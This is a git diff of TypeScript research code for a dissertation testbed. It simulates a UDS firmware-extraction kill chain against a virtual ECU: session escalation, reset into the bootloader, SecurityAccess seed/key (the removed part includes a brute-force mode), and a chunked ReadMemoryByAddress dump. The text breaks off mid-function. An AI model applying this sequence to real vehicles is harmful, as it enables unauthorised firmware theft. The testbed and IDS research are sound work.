@@ -1,507 +1,584 @@
 // ============================================================
-// Kill chain orchestrator — reproduces the Ford / VW T-Cross-style
-// firmware extraction attack documented in the dissertation case study.
+// UDS Kill-Chain Engine
 // ============================================================
 //
-// This is the "attacker side" of the demo. It composes UdsClient calls in
-// the canonical kill-chain phases:
+// Orchestrates the bidirectional ISO-TP / UDS exchange that
+// reproduces the firmware-extraction kill chain documented in
+// the dissertation case study (Ford / VW T-Cross). Two ISO-TP
+// stacks are connected back-to-back through a shared in-memory
+// bus so the engine can play both the diagnostic tester and the
+// simulated ECU.
 //
-//   Phase 1: Bus conditioning      — passive observation, looks like a tester
-//   Phase 2: DID reconnaissance     — 0x22 sweep of common DIDs
-//   Phase 3: Session escalation     — 0x10 to extended/programming
-//   Phase 4: ECU reset → bootloader — 0x11 sub 02 (keyOffOn)
-//   Phase 5: SecurityAccess         — 0x27 seed/key dance
-//   Phase 6: Firmware dump          — loop of 0x23 ReadMemoryByAddress
-//   Phase 7: Cleanup                — 0x10 to default + 0x11 soft reset
+// The engine logs every CAN frame that traverses the link with a
+// monotonically increasing timestamp and a decoded UDS service
+// label, producing a stream of `KillChainCanLog` entries that the
+// UI displays and the test fixtures assert against.
 //
-// Each phase is instrumented with start/end timestamps, frame counts,
-// throughput. The output is a `KillChainReport` suitable for both the UI
-// and the CSV log dumps used in the dissertation case-study chapter.
-//
-// Differentiators (vs naive scripted demo):
-//   - Multiple **scenarios** ('fast', 'realistic', 'brute-force') so the
-//     same testbed reproduces both an idealised attack and a noisy,
-//     IDS-detectable one. The 'brute-force' scenario deliberately spams
-//     0x27 to seed the IDS chapter's training data.
-//   - **Throughput accounting** per phase (bytes/sec) — published in the
-//     dissertation's Cap 6 results table.
-//   - **Verification step** at the end: the dumped firmware is compared
-//     byte-for-byte against the bootloader's original image. The report
-//     surfaces a SHA-256-like checksum (custom mixer to keep deps zero).
-//
-// Author: Marcelo Duchene (USP/ICMC) — feat/uds-isotp-bootloader-research
+// Author: Marcelo Duchene (USP/ICMC, dissertation feat/uds-isotp-bootloader)
 // ============================================================
 
-/* eslint-disable @typescript-eslint/no-explicit-any */
+import { BootloaderState } from './bootloader';
+import {
+  IsoTp,
+  IsoTpCanFrame,
+  IsoTpClock,
+  IsoTpPciType,
+  IsoTpStack,
+} from './iso-tp';
+import {
+  UdsServer,
+  UdsServerConfig,
+  UDS_NRC,
+  UDS_SID,
+  bytesToHex,
+  defaultComputeKey,
+  u32ToBytes,
+  bytesToU32,
+} from './uds';
 
-import { BootloaderState, weakComputeKey, hardenedComputeKey } from './bootloader';
-import { UdsClient, UdsClientResponse } from './uds-client';
-import { bytesToHex } from './iso-tp';
+/** Direction of a CAN frame on the diagnostic link. */
+export type FrameDirection = 'tester→ecu' | 'ecu→tester';
 
-// ------------------------------------------------------------
-// Scenarios
-// ------------------------------------------------------------
+/** Single CAN frame log entry (full timeline of the kill chain). */
+export interface KillChainCanLog {
+  /** Timestamp in microseconds, relative to engine start. */
+  timestampUs: number;
+  /** CAN identifier. */
+  canId: number;
+  /** Direction (request or response). */
+  direction: FrameDirection;
+  /** Data length code (1..8). */
+  dlc: number;
+  /** Raw 8 bytes (padded). */
+  data: Uint8Array;
+  /**
+   * Decoded ISO-TP / UDS context for the row, e.g. "UDS 0x10 DSC sub=0x03"
+   * or "ISO-TP CF seq=4". Pure-text, used in CSV exports and the UI table.
+   */
+  decoded: string;
+  /** UDS service identifier extracted from this frame, when applicable. */
+  udsService?: number;
+}
 
-export type KillChainScenario = 'fast' | 'realistic' | 'brute-force';
+/** Per-phase metadata captured by the engine (used by the UI / CSV split). */
+export interface KillChainPhaseLog {
+  name: string;
+  startUs: number;
+  endUs: number;
+  framesStart: number;
+  framesEnd: number;
+  description: string;
+}
 
 export interface KillChainOptions {
-  scenario: KillChainScenario;
-  /** Address from which to dump firmware. Default 0x00000000 (app_flash). */
-  dumpAddress: number;
-  /** Total bytes to dump. Default 524288 (512 KiB). */
-  dumpSize: number;
-  /** Bytes per 0x23 ReadMemory call. Default 4096. */
-  chunkSize: number;
-  /** Inter-phase pause (ms) — visible in the UI as breathing space. */
-  interPhasePauseMs: number;
-  /** Max attempts in brute-force scenario before giving up. */
-  bruteForceMaxAttempts: number;
-  /** SecurityAccess level (1, 3, 5...). Default 1. */
-  securityLevel: number;
-  /** If true, run the brute-force seed-key dance even if scenario is not 'brute-force'. */
-  forceBruteForce: boolean;
-  /** Optional progress reporter for the UI. */
-  onProgress?: (event: KillChainEvent) => void;
+  /** ECU diagnostic request CAN ID (tester → ECU). Default 0x7E0. */
+  ecuRequestId?: number;
+  /** ECU diagnostic response CAN ID (ECU → tester). Default 0x7E8. */
+  ecuResponseId?: number;
+  /** Starting memory address to dump. Default 0x00000000. */
+  dumpStartAddr?: number;
+  /** Total bytes to dump. Default 512 KB. */
+  dumpTotalBytes?: number;
+  /** Bytes per UDS 0x23 request. Default 4096. */
+  dumpChunkBytes?: number;
+  /** Bus conditioning frames to send before starting UDS. Default 50. */
+  busConditionFrames?: number;
+  /** Block size for ISO-TP FCs. Default 0 (no flow control between blocks). */
+  blockSize?: number;
+  /** STmin (raw byte). Default 0. */
+  stMin?: number;
+  /** Override the seed/key algorithm in the simulated ECU (advanced/tests). */
+  computeKey?: (seed: Uint32Array) => Uint32Array;
+  /** Custom DIDs map (overrides defaults from vehicle profile). */
+  dids?: Record<string, Uint8Array>;
+  /** Optional clock injection for tests. */
+  clock?: IsoTpClock;
+  /** Optional bootloader injection for tests (so the test can inspect the image). */
+  bootloader?: BootloaderState;
+  /** Optional callback fired on each new log entry. */
+  onLog?: (entry: KillChainCanLog) => void;
+  /** Optional callback fired on each phase transition. */
+  onPhase?: (phase: KillChainPhaseLog) => void;
+  /** Optional progress callback (0..1, message). */
+  onProgress?: (fraction: number, message: string) => void;
 }
 
-export const DEFAULT_KILL_CHAIN_OPTIONS: KillChainOptions = {
-  scenario: 'realistic',
-  dumpAddress: 0x0000_0000,
-  dumpSize: 512 * 1024,
-  chunkSize: 4096,
-  interPhasePauseMs: 200,
-  bruteForceMaxAttempts: 256,
-  securityLevel: 1,
-  forceBruteForce: false,
+/** Result of running the kill chain. */
+export interface KillChainResult {
+  /** All logged CAN frames, ordered by timestamp. */
+  log: KillChainCanLog[];
+  /** Per-phase logs. */
+  phases: KillChainPhaseLog[];
+  /** Reconstructed firmware dump (Uint8Array of dumpTotalBytes bytes). */
+  firmware: Uint8Array;
+  /** FNV-1a hash of the dump for quick equality checks in tests. */
+  firmwareHash: number;
+  /** Total wall-clock duration (us). */
+  totalDurationUs: number;
+  /** Total CAN frames exchanged. */
+  totalFrames: number;
+  /** Bootloader state at the end of the run (for inspection). */
+  bootloader: BootloaderState;
+}
+
+/** Default DIDs used by the simulator if the caller does not override them. */
+export function defaultDids(opts?: { vin?: string; partNumber?: string }): Record<string, Uint8Array> {
+  const enc = (s: string) => new TextEncoder().encode(s);
+  return {
+    F190: enc(opts?.vin ?? '9BFZH54P0LB123456'), // Brazilian-style VIN
+    F18C: enc('ECU_HYBRIDLAB_001'),
+    F191: enc('HW_REV_A2'),
+    F187: enc(opts?.partNumber ?? 'ECU-HYBRIDLAB-PN-0001'),
+    F195: enc('SW_BL_v1.0'),
+  };
+}
+
+/** Convenience to format a hex u8. */
+const hex2 = (b: number) => b.toString(16).toUpperCase().padStart(2, '0');
+const hex4 = (b: number) => b.toString(16).toUpperCase().padStart(4, '0');
+const hex8 = (b: number) => b.toString(16).toUpperCase().padStart(8, '0');
+
+const UDS_NAMES: Record<number, string> = {
+  [UDS_SID.DiagnosticSessionControl]: 'DSC',
+  [UDS_SID.ECUReset]: 'ECUReset',
+  [UDS_SID.ReadDataByIdentifier]: 'ReadDID',
+  [UDS_SID.ReadMemoryByAddress]: 'ReadMemoryByAddress',
+  [UDS_SID.SecurityAccess]: 'SecurityAccess',
+  [UDS_SID.TesterPresent]: 'TesterPresent',
 };
 
-// ------------------------------------------------------------
-// Events / phases
-// ------------------------------------------------------------
+const NRC_NAMES: Record<number, string> = Object.fromEntries(
+  Object.entries(UDS_NRC).map(([k, v]) => [v, k]),
+);
 
-export type KillChainPhase =
-  | 'init'
-  | 'conditioning'
-  | 'recon'
-  | 'session'
-  | 'reset'
-  | 'security'
-  | 'dump'
-  | 'cleanup'
-  | 'verify'
-  | 'done'
-  | 'error';
-
-export interface KillChainEvent {
-  phase: KillChainPhase;
-  timestampMs: number;
-  message: string;
-  request?: Uint8Array;
-  response?: Uint8Array;
-  latencyMs?: number;
-  bytesAccumulated?: number;
-}
-
-export interface PhaseStats {
-  phase: KillChainPhase;
-  startMs: number;
-  endMs: number;
-  durationMs: number;
-  requests: number;
-  bytesIn: number;
-  bytesOut: number;
-}
-
-export interface KillChainReport {
-  scenario: KillChainScenario;
-  startedMs: number;
-  endedMs: number;
-  totalDurationMs: number;
-  phases: PhaseStats[];
-  dumpedBytes: number;
-  bytesPerSecond: number;
-  dumpChecksum: string;
-  expectedChecksum: string;
-  verified: boolean;
-  events: KillChainEvent[];
-  error?: string;
-}
-
-// ------------------------------------------------------------
-// Custom 32-bit hash (no crypto dep, deterministic)
-// ------------------------------------------------------------
-
-function hash32(buf: Uint8Array): string {
-  // FNV-1a 32-bit (good enough for byte-level integrity in the demo report)
-  let h = 0x811c9dc5;
-  for (let i = 0; i < buf.length; i++) {
-    h ^= buf[i];
-    h = ((h * 0x01000193) >>> 0);
-  }
-  return h.toString(16).padStart(8, '0');
-}
-
-// ------------------------------------------------------------
-// Orchestrator
-// ------------------------------------------------------------
-
-export class KillChainOrchestrator {
-  private events: KillChainEvent[] = [];
-  private phases: PhaseStats[] = [];
-  private currentPhase: PhaseStats | null = null;
-
-  constructor(
-    private readonly client: UdsClient,
-    private readonly bootloader: BootloaderState,
-    private readonly opts: KillChainOptions = DEFAULT_KILL_CHAIN_OPTIONS,
-  ) {}
-
-  private now(): number {
-    return performance.now ? performance.now() : Date.now();
-  }
-
-  private startPhase(phase: KillChainPhase): void {
-    if (this.currentPhase) this.endPhase();
-    this.currentPhase = {
-      phase,
-      startMs: this.now(),
-      endMs: 0,
-      durationMs: 0,
-      requests: 0,
-      bytesIn: 0,
-      bytesOut: 0,
-    };
-    this.emit({ phase, timestampMs: this.now(), message: `phase started` });
-  }
-  private endPhase(): void {
-    if (!this.currentPhase) return;
-    this.currentPhase.endMs = this.now();
-    this.currentPhase.durationMs = this.currentPhase.endMs - this.currentPhase.startMs;
-    this.phases.push(this.currentPhase);
-    this.emit({ phase: this.currentPhase.phase, timestampMs: this.currentPhase.endMs, message: `phase done in ${this.currentPhase.durationMs.toFixed(0)}ms` });
-    this.currentPhase = null;
-  }
-  private accountResp(resp: UdsClientResponse): void {
-    if (!this.currentPhase) return;
-    this.currentPhase.requests++;
-    this.currentPhase.bytesOut += resp.request.length;
-    this.currentPhase.bytesIn += resp.response.length;
-  }
-  private emit(event: KillChainEvent): void {
-    this.events.push(event);
-    if (this.opts.onProgress) this.opts.onProgress(event);
-  }
-
-  // ------------- main entry ----------------
-
-  async run(): Promise<KillChainReport> {
-    const startedMs = this.now();
-    let dumped: Uint8Array | null = null;
-    let error: string | undefined;
-    try {
-      this.startPhase('init');
-      this.emit({ phase: 'init', timestampMs: this.now(), message: `scenario=${this.opts.scenario}, dump ${this.opts.dumpSize} bytes from 0x${this.opts.dumpAddress.toString(16)}` });
-      this.endPhase();
-
-      await this.phaseConditioning();
-      await this.phaseRecon();
-      await this.phaseSession();
-      await this.phaseReset();
-      await this.phaseSecurity();
-      dumped = await this.phaseDump();
-      await this.phaseCleanup();
-    } catch (e: any) {
-      error = e?.message || String(e);
-      this.emit({ phase: 'error', timestampMs: this.now(), message: error || 'unknown error' });
-      if (this.currentPhase) this.endPhase();
-    }
-
-    const endedMs = this.now();
-    const total = endedMs - startedMs;
-
-    // verify
-    this.startPhase('verify');
-    let verified = false;
-    let dumpChecksum = '';
-    let expectedChecksum = '';
-    if (dumped) {
-      const expected = this.bootloader.getCurrentMemory().slice(this.opts.dumpAddress, this.opts.dumpAddress + this.opts.dumpSize);
-      dumpChecksum = hash32(dumped);
-      expectedChecksum = hash32(expected);
-      verified = dumpChecksum === expectedChecksum;
-      this.emit({ phase: 'verify', timestampMs: this.now(), message: `checksum=${dumpChecksum}, expected=${expectedChecksum}, verified=${verified}` });
-    }
-    this.endPhase();
-    this.startPhase('done');
-    this.endPhase();
-
-    const dumpedBytes = dumped ? dumped.length : 0;
-    const bytesPerSecond = total > 0 ? (dumpedBytes / (total / 1000)) : 0;
-
-    return {
-      scenario: this.opts.scenario,
-      startedMs,
-      endedMs,
-      totalDurationMs: total,
-      phases: this.phases.slice(),
-      dumpedBytes,
-      bytesPerSecond,
-      dumpChecksum,
-      expectedChecksum,
-      verified,
-      events: this.events.slice(),
-      error,
-    };
-  }
-
-  // ------------- phases ----------------
-
-  /** Phase 1: passive observation (no real frames; just timing + log). */
-  private async phaseConditioning(): Promise<void> {
-    this.startPhase('conditioning');
-    const dur = this.opts.scenario === 'fast' ? 100 : (this.opts.scenario === 'brute-force' ? 200 : 500);
-    this.emit({ phase: 'conditioning', timestampMs: this.now(), message: `passive observation ${dur}ms` });
-    await this.client.sleep(dur);
-    this.endPhase();
-  }
-
-  /** Phase 2: DID reconnaissance — sweep common DIDs. */
-  private async phaseRecon(): Promise<void> {
-    this.startPhase('recon');
-    const dids = [0xF180, 0xF181, 0xF187, 0xF18C, 0xF190, 0xF195];
-    for (const did of dids) {
-      const r = await this.client.readDid(did);
-      this.accountResp(r);
-      this.emit({
-        phase: 'recon',
-        timestampMs: this.now(),
-        message: `0x22 ${did.toString(16).toUpperCase()} -> ${r.isPositive ? new TextDecoder().decode(r.response.slice(3)) : `NRC ${r.nrc?.toString(16)}`}`,
-        request: r.request,
-        response: r.response,
-        latencyMs: r.latencyMs,
-      });
-      await this.client.sleep(this.opts.scenario === 'fast' ? 5 : 30);
-    }
-    await this.client.sleep(this.opts.interPhasePauseMs);
-    this.endPhase();
-  }
-
-  /** Phase 3: enter extended session, then programming. */
-  private async phaseSession(): Promise<void> {
-    this.startPhase('session');
-    const r1 = await this.client.diagnosticSessionControl(0x03);
-    this.accountResp(r1);
-    this.emit({ phase: 'session', timestampMs: this.now(), message: `0x10 03 (extended) -> ${r1.isPositive ? 'OK' : `NRC ${r1.nrc?.toString(16)}`}`, request: r1.request, response: r1.response, latencyMs: r1.latencyMs });
-
-    await this.client.sleep(this.opts.scenario === 'fast' ? 10 : 50);
-
-    const r2 = await this.client.diagnosticSessionControl(0x02);
-    this.accountResp(r2);
-    this.emit({ phase: 'session', timestampMs: this.now(), message: `0x10 02 (programming) -> ${r2.isPositive ? 'OK' : `NRC ${r2.nrc?.toString(16)}`}`, request: r2.request, response: r2.response, latencyMs: r2.latencyMs });
-    await this.client.sleep(this.opts.interPhasePauseMs);
-    this.endPhase();
-  }
-
-  /** Phase 4: ECU reset → bootloader. */
-  private async phaseReset(): Promise<void> {
-    this.startPhase('reset');
-    const r = await this.client.ecuReset(0x02); // keyOffOn => bootloader
-    this.accountResp(r);
-    this.emit({ phase: 'reset', timestampMs: this.now(), message: `0x11 02 (keyOffOn) -> ${r.isPositive ? 'OK, ECU rebooting into bootloader' : `NRC ${r.nrc?.toString(16)}`}`, request: r.request, response: r.response, latencyMs: r.latencyMs });
-    // Real ECUs take 100-500 ms to reboot
-    await this.client.sleep(this.opts.scenario === 'fast' ? 50 : 300);
-    // Re-enter programming session in bootloader
-    const r2 = await this.client.diagnosticSessionControl(0x02);
-    this.accountResp(r2);
-    this.emit({ phase: 'reset', timestampMs: this.now(), message: `0x10 02 (programming, post-boot) -> ${r2.isPositive ? 'OK' : `NRC ${r2.nrc?.toString(16)}`}`, request: r2.request, response: r2.response, latencyMs: r2.latencyMs });
-    this.endPhase();
-  }
-
-  /** Phase 5: SecurityAccess. Either dance honestly (we know the seed) or brute force. */
-  private async phaseSecurity(): Promise<void> {
-    this.startPhase('security');
-    const useBruteForce = this.opts.forceBruteForce || this.opts.scenario === 'brute-force';
-    if (useBruteForce) {
-      await this.bruteForceSecurity();
-    } else {
-      await this.honestSecurityDance();
-    }
-    this.endPhase();
-  }
-
-  private async honestSecurityDance(): Promise<void> {
-    const seedReq = await this.client.securityAccessSeed(this.opts.securityLevel);
-    this.accountResp(seedReq);
-    if (!seedReq.isPositive) {
-      throw new Error(`SecurityAccess seed failed NRC=${seedReq.nrc?.toString(16)}`);
-    }
-    const seed = seedReq.response.slice(2);
-    this.emit({ phase: 'security', timestampMs: this.now(), message: `0x27 ${this.opts.securityLevel.toString(16)} seed=${bytesToHex(seed)}`, request: seedReq.request, response: seedReq.response, latencyMs: seedReq.latencyMs });
-
-    // Compute key — use the bootloader's own algo (we are the attacker but
-    // assume the algorithm has been recovered through binary RE).
-    const profile = this.bootloader.cfg.security.profile;
-    const key = profile === 'hardened'
-      ? hardenedComputeKey(seed, this.bootloader.cfg.security.sharedKey || new Uint8Array(16))
-      : weakComputeKey(seed);
-    await this.client.sleep(this.opts.scenario === 'fast' ? 5 : 30);
-    const keyReq = await this.client.securityAccessKey(this.opts.securityLevel, key);
-    this.accountResp(keyReq);
-    this.emit({ phase: 'security', timestampMs: this.now(), message: `0x27 ${(this.opts.securityLevel + 1).toString(16)} key=${bytesToHex(key)} -> ${keyReq.isPositive ? 'UNLOCKED' : `NRC ${keyReq.nrc?.toString(16)}`}`, request: keyReq.request, response: keyReq.response, latencyMs: keyReq.latencyMs });
-    if (!keyReq.isPositive) {
-      throw new Error(`SecurityAccess key rejected NRC=${keyReq.nrc?.toString(16)}`);
-    }
-  }
-
-  private async bruteForceSecurity(): Promise<void> {
-    // For 16-bit weak seeds, an attacker can offline-precompute the
-    // (seed, key) table for the recovered algorithm. We simulate this:
-    // we keep requesting seed/key with WRONG keys (random) until either
-    // luck strikes or we exhaust attempts.
-    let success = false;
-    for (let attempt = 0; attempt < this.opts.bruteForceMaxAttempts && !success; attempt++) {
-      const seedReq = await this.client.securityAccessSeed(this.opts.securityLevel);
-      this.accountResp(seedReq);
-      if (!seedReq.isPositive) {
-        if (seedReq.nrc === 0x37) {
-          // Lockout — wait a bit
-          this.emit({ phase: 'security', timestampMs: this.now(), message: `Lockout (NRC 0x37) — waiting`, response: seedReq.response });
-          await this.client.sleep(1000);
-          continue;
-        }
-        throw new Error(`Brute force: seed failed NRC=${seedReq.nrc?.toString(16)}`);
+/**
+ * Decode an ISO-TP frame into a human-readable label. Pure function for tests.
+ */
+export function describeFrame(data: Uint8Array, lastUdsSid: number | null = null): {
+  label: string;
+  udsSid?: number;
+} {
+  const pci = IsoTp.pciType(data);
+  const tag = ['SF', 'FF', 'CF', 'FC'][pci] ?? '??';
+  const head = `ISO-TP ${tag}`;
+  switch (pci) {
+    case IsoTpPciType.SF: {
+      const sid = data[1];
+      let txt = `${head} len=${data[0] & 0x0f}`;
+      if (sid === 0x7f) {
+        const inner = data[2];
+        const nrc = data[3];
+        const name = UDS_NAMES[inner] ?? `0x${hex2(inner)}`;
+        const nrcName = NRC_NAMES[nrc] ?? `0x${hex2(nrc)}`;
+        txt += ` | UDS NEG ${name} NRC=${nrcName}`;
+        return { label: txt, udsSid: inner };
       }
-      const seed = seedReq.response.slice(2);
-      // Random wrong key
-      const key = new Uint8Array(seed.length);
-      for (let i = 0; i < key.length; i++) key[i] = Math.floor(Math.random() * 256);
-      const keyReq = await this.client.securityAccessKey(this.opts.securityLevel, key);
-      this.accountResp(keyReq);
-      this.emit({
-        phase: 'security',
-        timestampMs: this.now(),
-        message: `Brute-force attempt #${attempt + 1} seed=${bytesToHex(seed)} key=${bytesToHex(key)} -> ${keyReq.isPositive ? 'UNLOCKED' : `NRC ${keyReq.nrc?.toString(16)}`}`,
-      });
-      if (keyReq.isPositive) {
-        success = true;
-        return;
-      }
-      await this.client.sleep(this.opts.scenario === 'fast' ? 1 : 20);
+      const isResponse = (sid & 0x40) !== 0 && (sid & 0xbf) !== sid; // crude
+      const baseSid = isResponse ? sid - 0x40 : sid;
+      const name = UDS_NAMES[baseSid] ?? `SID=0x${hex2(sid)}`;
+      txt += ` | UDS ${isResponse ? 'RESP' : 'REQ '} ${name}`;
+      return { label: txt, udsSid: baseSid };
     }
-    if (!success) {
-      // Fall back to honest derivation so the demo still completes (we want a verified dump).
-      this.emit({ phase: 'security', timestampMs: this.now(), message: `Brute force exhausted ${this.opts.bruteForceMaxAttempts} attempts; falling back to recovered algorithm` });
-      await this.honestSecurityDance();
+    case IsoTpPciType.FF: {
+      const total = ((data[0] & 0x0f) << 8) | data[1];
+      const sid = data[2];
+      const isResponse = (sid & 0x40) !== 0;
+      const baseSid = isResponse ? sid - 0x40 : sid;
+      const name = UDS_NAMES[baseSid] ?? `SID=0x${hex2(sid)}`;
+      return {
+        label: `${head} total=${total}B | UDS ${isResponse ? 'RESP' : 'REQ '} ${name}`,
+        udsSid: baseSid,
+      };
     }
+    case IsoTpPciType.CF: {
+      const seq = data[0] & 0x0f;
+      return {
+        label: `${head} seq=${seq}${lastUdsSid ? ` (cont. ${UDS_NAMES[lastUdsSid] ?? 'SID 0x' + hex2(lastUdsSid)})` : ''}`,
+        udsSid: lastUdsSid ?? undefined,
+      };
+    }
+    case IsoTpPciType.FC: {
+      const flag = data[0] & 0x0f;
+      const flagName = ['CTS', 'WAIT', 'OVFLW'][flag] ?? `0x${hex2(flag)}`;
+      return { label: `${head} ${flagName} BS=${data[1]} STmin=0x${hex2(data[2])}` };
+    }
+    default:
+      return { label: `${head} (raw=${bytesToHex(data)})` };
   }
-
-  /** Phase 6: dump firmware via 0x23 in chunks. */
-  private async phaseDump(): Promise<Uint8Array> {
-    this.startPhase('dump');
-    const total = this.opts.dumpSize;
-    const chunk = this.opts.chunkSize;
-    const out = new Uint8Array(total);
-    let off = 0;
-    while (off < total) {
-      const remaining = total - off;
-      const take = Math.min(chunk, remaining);
-      const r = await this.client.readMemory(this.opts.dumpAddress + off, take, 4, 2);
-      this.accountResp(r);
-      if (!r.isPositive) {
-        throw new Error(`0x23 failed at offset ${off}: NRC=${r.nrc?.toString(16)}`);
-      }
-      const data = r.response.slice(1);
-      if (data.length !== take) {
-        throw new Error(`0x23 returned ${data.length} bytes, expected ${take}`);
-      }
-      out.set(data, off);
-      off += take;
-      // Emit progress every 16 chunks
-      if (((off / chunk) | 0) % 16 === 0) {
-        this.emit({
-          phase: 'dump',
-          timestampMs: this.now(),
-          message: `dumped ${off}/${total} bytes (${((off / total) * 100).toFixed(1)}%)`,
-          bytesAccumulated: off,
-          latencyMs: r.latencyMs,
-        });
-      }
-      // Pacing
-      if (this.opts.scenario === 'realistic') {
-        await this.client.sleep(5);
-      }
-    }
-    this.emit({ phase: 'dump', timestampMs: this.now(), message: `dump complete: ${out.length} bytes`, bytesAccumulated: out.length });
-    this.endPhase();
-    return out;
-  }
-
-  /** Phase 7: cleanup — return to default session, soft reset. */
-  private async phaseCleanup(): Promise<void> {
-    this.startPhase('cleanup');
-    try {
-      const r1 = await this.client.diagnosticSessionControl(0x01);
-      this.accountResp(r1);
-      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `0x10 01 (default) -> ${r1.isPositive ? 'OK' : `NRC ${r1.nrc?.toString(16)}`}` });
-    } catch (e: any) {
-      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `cleanup ignored: ${e?.message}` });
-    }
-    try {
-      const r2 = await this.client.ecuReset(0x03); // soft reset
-      this.accountResp(r2);
-      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `0x11 03 (softReset) -> ${r2.isPositive ? 'OK' : `NRC ${r2.nrc?.toString(16)}`}` });
-    } catch (e: any) {
-      this.emit({ phase: 'cleanup', timestampMs: this.now(), message: `cleanup ignored: ${e?.message}` });
-    }
-    this.endPhase();
-  }
-}
-
-// ------------------------------------------------------------
-// CSV log writer (BRAIN-compatible format)
-// ------------------------------------------------------------
-
-export interface CsvFrameRecord {
-  timestampUs: number;
-  canId: number;
-  direction: 'tx' | 'rx';
-  dlc: number;
-  dataHex: string;
-  decodedUds?: string;
 }
 
 /**
- * Emit a CSV string with the kill-chain CAN frame log in a BRAIN-compatible
- * format used by the dissertation dataset chapter.
- *
- * Header: timestamp_us,can_id,direction,dlc,data_hex,decoded_uds_service
+ * In-memory CAN bus that connects the tester and ECU stacks back-to-back.
+ * Frames written by one side are delivered synchronously to the other, with
+ * each delivery routed through the engine's logger.
  */
-export function framesToCsv(records: CsvFrameRecord[]): string {
-  const lines = ['timestamp_us,can_id,direction,dlc,data_hex,decoded_uds_service'];
-  for (const r of records) {
-    const id = '0x' + r.canId.toString(16).toUpperCase().padStart(3, '0');
-    const dataHex = r.dataHex.replace(/\s+/g, '');
-    const decoded = (r.decodedUds || '').replace(/[",\n]/g, ' ');
-    lines.push(`${r.timestampUs},${id},${r.direction},${r.dlc},${dataHex},${decoded}`);
+class VirtualCanBus {
+  private testerInbox: ((f: IsoTpCanFrame) => void) | null = null;
+  private ecuInbox: ((f: IsoTpCanFrame) => void) | null = null;
+  constructor(private readonly logger: (f: IsoTpCanFrame, dir: FrameDirection) => void) {}
+
+  attachTester(rx: (f: IsoTpCanFrame) => void) {
+    this.testerInbox = rx;
+  }
+  attachEcu(rx: (f: IsoTpCanFrame) => void) {
+    this.ecuInbox = rx;
+  }
+  /** Tester-side send → goes to ECU. */
+  sendFromTester(f: IsoTpCanFrame): void {
+    this.logger(f, 'tester→ecu');
+    this.ecuInbox?.(f);
+  }
+  /** ECU-side send → goes back to tester. */
+  sendFromEcu(f: IsoTpCanFrame): void {
+    this.logger(f, 'ecu→tester');
+    this.testerInbox?.(f);
+  }
+}
+
+/**
+ * Tester-side helper that wraps an IsoTpStack with a "request → wait for one
+ * response" idiom. Concurrent requests on the same ID are not allowed.
+ */
+class TesterClient {
+  private pending: ((payload: Uint8Array) => void) | null = null;
+  constructor(private readonly stack: IsoTpStack) {
+    stack.addListener((payload) => {
+      const cb = this.pending;
+      this.pending = null;
+      cb?.(payload);
+    });
+  }
+
+  /** Send a UDS request and wait for the response (resolves with raw UDS bytes). */
+  request(payload: Uint8Array, timeoutMs = 5000): Promise<Uint8Array> {
+    return new Promise<Uint8Array>((resolve, reject) => {
+      if (this.pending) {
+        reject(new Error('TesterClient: request already pending'));
+        return;
+      }
+      const timer = setTimeout(() => {
+        this.pending = null;
+        reject(new Error('TesterClient: response timeout'));
+      }, timeoutMs);
+      this.pending = (resp) => {
+        clearTimeout(timer);
+        resolve(resp);
+      };
+      this.stack.sendBuffer(payload).catch((e) => {
+        clearTimeout(timer);
+        this.pending = null;
+        reject(e);
+      });
+    });
+  }
+}
+
+/**
+ * Run the full firmware-extraction kill chain.
+ *
+ * Phases:
+ *   1. Bus conditioning (passive benign frames on 0x100..0x103 to mimic real bus)
+ *   2. UDS DSC: enter extended (0x10 03)
+ *   3. UDS DSC: enter programming (0x10 02)
+ *   4. UDS ECUReset: enter bootloader (0x11 02)
+ *   5. UDS DSC: re-enter programming after reset
+ *   6. UDS SecurityAccess: requestSeed (0x27 01) + sendKey (0x27 02)
+ *   7. UDS ReadMemoryByAddress: loop chunked read (0x23) over the full image
+ *   8. Reassemble firmware, compute hash, return result
+ */
+export async function runKillChain(opts: KillChainOptions = {}): Promise<KillChainResult> {
+  const ecuReqId = opts.ecuRequestId ?? 0x7e0;
+  const ecuRespId = opts.ecuResponseId ?? 0x7e8;
+  const dumpStart = opts.dumpStartAddr ?? 0x00000000;
+  const dumpTotal = opts.dumpTotalBytes ?? 512 * 1024;
+  const chunk = opts.dumpChunkBytes ?? 4094; // ISO-TP cap - 1 SID byte
+  const busFrames = opts.busConditionFrames ?? 50;
+  const blockSize = opts.blockSize ?? 0;
+  const stMin = opts.stMin ?? 0;
+  const clock = opts.clock; // undefined → real clock inside the stack
+
+  const bootloader = opts.bootloader ?? new BootloaderState();
+  const dids = opts.dids ?? defaultDids();
+
+  const log: KillChainCanLog[] = [];
+  const phases: KillChainPhaseLog[] = [];
+  const startMs =
+    typeof performance !== 'undefined' && performance.now ? performance.now() : Date.now();
+  let lastUdsSid: number | null = null;
+
+  const pushFrame = (f: IsoTpCanFrame, dir: FrameDirection) => {
+    const nowMs =
+      (typeof performance !== 'undefined' && performance.now ? performance.now() : Date.now()) -
+      startMs;
+    const decoded = describeFrame(f.data, lastUdsSid);
+    if (decoded.udsSid !== undefined) lastUdsSid = decoded.udsSid;
+    const entry: KillChainCanLog = {
+      timestampUs: Math.round(nowMs * 1000),
+      canId: f.id,
+      direction: dir,
+      dlc: f.data.length,
+      data: f.data,
+      decoded: decoded.label,
+      udsService: decoded.udsSid,
+    };
+    log.push(entry);
+    opts.onLog?.(entry);
+  };
+
+  const bus = new VirtualCanBus(pushFrame);
+
+  // ECU side: server using the synthetic image
+  const ecuStack = new IsoTpStack(
+    {
+      txId: ecuRespId,
+      rxId: ecuReqId,
+      blockSize,
+      stMin,
+    },
+    (f) => bus.sendFromEcu(f),
+    clock,
+  );
+  bus.attachEcu((f) => ecuStack.onCanFrame(f));
+
+  const serverCfg: UdsServerConfig = {
+    dids,
+    bootloader,
+    computeKey: opts.computeKey ?? defaultComputeKey,
+  };
+  const server = new UdsServer(serverCfg);
+  ecuStack.addListener((req) => {
+    const resp = server.handleRequest(req);
+    if (resp) {
+      ecuStack.sendBuffer(resp).catch(() => void 0);
+    }
+  });
+
+  // Tester side: client
+  const testerStack = new IsoTpStack(
+    {
+      txId: ecuReqId,
+      rxId: ecuRespId,
+      blockSize,
+      stMin,
+    },
+    (f) => bus.sendFromTester(f),
+    clock,
+  );
+  bus.attachTester((f) => testerStack.onCanFrame(f));
+  const tester = new TesterClient(testerStack);
+
+  const phaseStart = (name: string, description: string): KillChainPhaseLog => {
